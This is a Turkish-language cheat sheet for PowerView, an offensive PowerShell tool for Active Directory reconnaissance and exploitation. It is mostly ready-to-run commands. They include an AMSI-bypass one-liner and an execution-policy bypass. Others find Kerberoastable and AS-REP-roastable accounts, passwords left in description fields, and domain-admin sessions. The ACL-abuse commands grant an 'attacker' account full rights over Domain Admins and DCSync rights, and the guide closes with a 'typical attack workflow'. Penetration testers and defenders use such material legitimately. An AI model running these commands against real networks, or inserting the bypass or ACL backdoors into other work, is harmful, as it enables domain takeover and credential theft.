# ⚡ PowerView - PowerShell ile AD Keşif Kılavuzu

[🇬🇧 English](../../README.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ██╗   ██╗██╗███████╗██╗    ██╗
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██║   ██║██║██╔════╝██║    ██║
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██║██╔══╝  ██║███╗██║
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ██║███████╗╚███╔███╔╝
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ 
                  PowerShell Active Directory Keşfi
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerView-Active_Directory-blue?style=for-the-badge" alt="PowerView">
  <img src="https://img.shields.io/badge/PowerShell-red?style=for-the-badge" alt="PowerShell">
</p>

---

## 📋 İçindekiler

- [PowerView Nedir?](#-powerview-nedir)
- [Kurulum ve Hazırlık](#-kurulum-ve-hazırlık)
- [Etki Alanı (Domain) Keşfi](#-etki-alanı-domain-keşfi)
- [Kullanıcı Keşfi](#-kullanıcı-keşfi)
- [Grup Keşfi](#-grup-keşfi)
- [Bilgisayar Keşfi](#-bilgisayar-keşfi)
- [ACL (Erişim Denetim Listesi) Keşfi](#-acl-erişim-denetim-listesi-keşfi)
- [Güven İlişkileri (Trusts) Keşfi](#-güven-i̇lişkileri-trusts-keşfi)
- [GPO (Grup İlkesi) Keşfi](#-gpo-grup-i̇lkesi-keşfi)
- [Hedef / Oturum Avı (Hunting)](#-hedef--oturum-avı-hunting)
- [Hızlı Başvuru](#-hızlı-başvuru)

---

## 🎯 PowerView Nedir?

**PowerView**, Active Directory ortamlarında keşif ve istismar için kullanılan güçlü bir PowerShell aracıdır:

- 🔍 **Keşif (Enumeration)** - Kullanıcılar, gruplar, bilgisayarlar ve GPO'lar
- 🔐 **ACL İnceleme** - Yanlış yapılandırılmış ayrıcalık ve izinleri tespit etme
- 🌐 **Güven İlişkileri (Trusts)** - Etki alanları arası ilişkileri haritalandırma
- 🎯 **Avcılık (Hunting)** - Kritik kullanıcıların hangi makinelerde oturum açtığını bulma

---

## 🚀 Kurulum ve Hazırlık

### PowerView İndirme

```powershell
# PowerSploit deposundan
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# SharpHound / BloodHound ile birlikte gelen sürüm
# PowerView.ps1 BloodHound ile birlikte dağıtılmaktadır
```

### Modülü İçe Aktarma

```powershell
# Çalıştırma politikasını atlatma (Execution Policy Bypass)
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Modülü içe aktarma
Import-Module .\PowerView.ps1

# Veya doğrudan dot-source ile yükleme
. .\PowerView.ps1
```

### AMSI Atlatma (Gerekirse)

```powershell
# Basit AMSI atlatma tek satırlık kodu
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 🏢 Etki Alanı (Domain) Keşfi

### Temel Etki Alanı Bilgileri

```powershell
# Etki alanı bilgilerini al
Get-Domain

# Etki alanı SID değerini al
Get-DomainSID

# Etki alanı ilkelerini (policies) al
Get-DomainPolicy

# Etki alanı denetleyicilerini (DC) listele
Get-DomainController
Get-DomainController -Domain other.domain.local

# Orman (Forest) bilgilerini al
Get-Forest
Get-ForestDomain
```

### Etki Alanı İlkeleri (Domain Policy)

```powershell
# Parola politikası
(Get-DomainPolicy)."SystemAccess"

# Kerberos politikası
(Get-DomainPolicy)."KerberosPolicy"
```

---

## 👤 Kullanıcı Keşfi

### Kullanıcıları Listeleme

```powershell
# Tüm kullanıcılar
Get-DomainUser

# Belirli bir kullanıcı
Get-DomainUser -Identity admin

# Kullanıcı özellikleri
Get-DomainUser -Identity admin -Properties *
Get-DomainUser -Identity admin -Properties samaccountname,description

# Açıklama (description) alanına sahip kullanıcılar
Get-DomainUser -LDAPFilter "(description=*)" | Select-Object samaccountname,description
```

### İlgi Çekici Kullanıcıları Bulma

```powershell
# SPN tanımlı kullanıcılar (Kerberoasting yapılabilir)
Get-DomainUser -SPN

# Ön kimlik doğrulama gerektirmeyen kullanıcılar (AS-REP Roasting yapılabilir)
Get-DomainUser -PreauthNotRequired

# AdminCount değeri 1 olan korumalı hesaplar
Get-DomainUser -AdminCount

# Açıklama alanında parola geçen kullanıcılar
Get-DomainUser -LDAPFilter "(description=*pass*)" | Select-Object samaccountname,description
```

### Kullanıcı Oturumları

```powershell
# Kullanıcının nerede oturum açtığını bulma
Find-DomainUserLocation -UserIdentity admin

# Yönetici erişimimizin olduğu makineleri bulma
Find-LocalAdminAccess
```

---

## 👥 Grup Keşfi

### Grupları Listeleme

```powershell
# Tüm gruplar
Get-DomainGroup

# Belirli bir grup
Get-DomainGroup -Identity "Domain Admins"

# Grup üyeleri
Get-DomainGroupMember -Identity "Domain Admins"

# İçiçe (recursive) tüm grup üyeleri
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

### Önemli Gruplar

```powershell
# Domain Admins
Get-DomainGroupMember -Identity "Domain Admins"

# Enterprise Admins
Get-DomainGroupMember -Identity "Enterprise Admins"

# Administrators
Get-DomainGroupMember -Identity "Administrators"

# Bir kullanıcının üye olduğu grupları bulma
Get-DomainGroup -UserName admin
```

### Yerel Gruplar

```powershell
# Belirli bir makinedeki yerel yöneticiler
Get-NetLocalGroupMember -ComputerName server01

# Ağ genelinde Administrators grubunu arama
Find-DomainLocalGroupMember -GroupName Administrators
```

---

## 💻 Bilgisayar Keşfi

### Bilgisayarları Listeleme

```powershell
# Tüm bilgisayarlar
Get-DomainComputer

# Belirli bir bilgisayar
Get-DomainComputer -Identity server01

# Belirli özellikleri listeleme
Get-DomainComputer -Properties operatingsystem,serviceprincipalname

# Kısıtlamasız yetkilendirmeye (Unconstrained Delegation) sahip bilgisayarlar
Get-DomainComputer -Unconstrained
```

### Hedef Sistemleri Bulma

```powershell
# Etki alanı denetleyicileri (DC)
Get-DomainController

# Sunucu işletim sistemleri
Get-DomainComputer -OperatingSystem "*Server*"

# Windows 10 istemcileri
Get-DomainComputer -OperatingSystem "*Windows 10*"

# Eski işletim sistemleri (örneğin 2008)
Get-DomainComputer -OperatingSystem "*2008*"
```

### Ağ Paylaşımları (Shares)

```powershell
# Ağ paylaşımlarını bulma
Find-DomainShare

# Yazılabilir paylaşımları bulma
Find-DomainShare -CheckShareAccess

# Paylaşımlarda ilgi çekici dosyaları arama
Find-InterestingDomainShareFile
Find-InterestingDomainShareFile -Include *.txt,*.doc,*.xlsx
```

---

## 🔐 ACL (Erişim Denetim Listesi) Keşfi

### Temel ACL İnceleme

```powershell
# Kullanıcıya ait ACL izinleri
Get-DomainObjectAcl -Identity admin

# GUID değerlerini insan tarafından okunabilir isimlere çözümleme
Get-DomainObjectAcl -Identity admin -ResolveGUIDs

# Belirli izinleri arama (örneğin GenericAll)
Get-DomainObjectAcl -Identity admin -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

### İlgi Çekici ACL İzinlerini Bulma

```powershell
# Bir kullanıcı üzerinde GenericAll yetkisi arama
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll" -and $_.SecurityIdentifier -match "S-1-5-21-.*-1107"}

# WriteProperty izinleri
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty"}

# WriteDacl izinleri
Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteDacl"}
```

### DCSync Yetkileri

```powershell
# DCSync yetkisine sahip hesapları arama
Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "Replication-Get") -or ($_.ActiveDirectoryRights -match "GenericAll")}
```

### ACL Değiştirme / İstismar

```powershell
# Bir kullanıcı için gruba GenericAll izni ekleme
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All

# Kullanıcıya DCSync yetkisi atama
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

---

## 🤝 Güven İlişkileri (Trusts) Keşfi

### Etki Alanı Güvenleri

```powershell
# Güven ilişkilerini al
Get-DomainTrust

# Belirli bir etki alanına ait güvenler
Get-DomainTrust -Domain domain.local

# Tüm güven haritasını çıkar
Get-DomainTrustMapping
```

### Orman Güvenleri (Forest Trusts)

```powershell
# Orman güvenleri
Get-ForestTrust

# Orman içindeki etki alanları
Get-ForestDomain
```

### Güven Türleri

| Güven Türü | Yön | Açıklama |
|------------|-----|----------|
| Bidirectional (Çift Yönlü) | Two-way | Her iki etki alanı birbirine güvenir |
| Inbound (Gelen) | One-way | Diğer etki alanı bize güvenir |
| Outbound (Giden) | One-way | Biz diğer etki alanına güveniriz |

---

## 📜 GPO (Grup İlkesi) Keşfi

### GPO'ları Listeleme

```powershell
# Tüm GPO'lar
Get-DomainGPO

# İsme göre GPO arama
Get-DomainGPO -Identity "Default Domain Policy"

# Belirli bir bilgisayar/OU üzerindeki GPO'lar
Get-DomainGPO -ComputerIdentity server01
```

### GPO İzinlerini İnceleme

```powershell
# Kullanıcının düzenleyebileceği GPO'ları bulma
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "WriteProperty" -or $_.ActiveDirectoryRights -match "GenericAll"}
```

### GPO Konumları ve Bağlantıları

```powershell
# GPO'nun uygulandığı OU'ları bulma
Get-DomainOU -GPLink "{GPO-GUID}"

# Belirli bir bilgisayara uygulanan GPO
Get-DomainGPO -ComputerIdentity "server01"
```

---

## 🎯 Hedef / Oturum Avı (Hunting)

### Yerel Yönetici Erişimlerini Bulma

```powershell
# Nerelerde yerel yöneticiyiz?
Find-LocalAdminAccess

# İş parçacığı (threading) belirterek
Find-LocalAdminAccess -Threads 10

# Belirli bir bilgisayar listesi üzerinde
Find-LocalAdminAccess -ComputerFile computers.txt
```

### Kullanıcı Oturum Konumlarını Bulma

```powershell
# Kullanıcı nerede oturum açmış?
Find-DomainUserLocation

# Belirli bir kullanıcı için oturum ara
Find-DomainUserLocation -UserIdentity admin

# Yalnızca erişim yetkimiz olan bilgisayarları tara
Find-DomainUserLocation -CheckAccess
```

### Oturumları Listeleme

```powershell
# Belirli makinedeki oturumlar
Get-NetSession -ComputerName dc01

# Oturum açmış kullanıcılar
Get-NetLoggedon -ComputerName server01

# RDP oturumları
Get-NetRDPSession -ComputerName server01
```

### Özel Kullanıcıları Avlama (User Hunting)

```powershell
# Domain Admins üyelerinin oturumlarını bul
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Kullanıcı avcısı fonksiyonu
Invoke-UserHunter

# Gizli (stealth) modda avlanma
Invoke-UserHunter -Stealth
```

---

## 📊 Hızlı Başvuru

### Temel Komutlar

| Komut | Açıklama |
|-------|----------|
| `Get-Domain` | Etki alanı bilgisi |
| `Get-DomainUser` | Kullanıcıları listele |
| `Get-DomainGroup` | Grupları listele |
| `Get-DomainComputer` | Bilgisayarları listele |
| `Get-DomainController` | DC'leri listele |
| `Get-DomainTrust` | Güven ilişkilerini listele |
| `Get-DomainGPO` | GPO'ları listele |
| `Find-LocalAdminAccess` | Yönetici erişimlerini bul |
| `Find-DomainUserLocation` | Kullanıcı oturumlarını bul |

### Kerberos Hedefleri

| Komut | Açıklama |
|-------|----------|
| `Get-DomainUser -SPN` | Kerberoast edilebilir hesaplar |
| `Get-DomainUser -PreauthNotRequired` | AS-REP roast edilebilir hesaplar |
| `Get-DomainComputer -Unconstrained` | Kısıtlamasız yetkilendirmeye sahip sistemler |

### Yaygın Filtreleme Kalıpları

```powershell
# Özelliklere göre filtreleme
Get-DomainUser -Properties samaccountname,description

# LDAP filtresi ile arama
Get-DomainUser -LDAPFilter "(description=*admin*)"

# Where-Object ile filtreleme
Get-DomainUser | ? {$_.samaccountname -like "*svc*"}
```

### Tipik Saldırı İş Akışı

```powershell
# 1. Modülü içe aktar
Import-Module .\PowerView.ps1

# 2. Etki alanını tara
Get-Domain
Get-DomainController

# 3. Zafiyet barındıran kullanıcıları tespit et
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired

# 4. Yerel yönetici yetkimiz olan makineleri bul
Find-LocalAdminAccess

# 5. Domain Admin oturumlarını avla
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# 6. ACL izinlerini denetle
Get-DomainObjectAcl -Identity admin -ResolveGUIDs
```

---

## 📚 Kaynaklar

- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

### İlgili Kılavuzlar
- [BloodHound](../../BloodHound/translations/README.tr.md)
- [PowerShell](../../PowerShell/translations/README.tr.md)
- [Mimikatz](../../Mimikatz/translations/README.tr.md)

---

<p align="center">
  <b>⚡ PowerShell ile Etki Alanı Keşfi!</b><br>
  <i>PowerView - Klasik Active Directory keşif aracı</i>
</p>
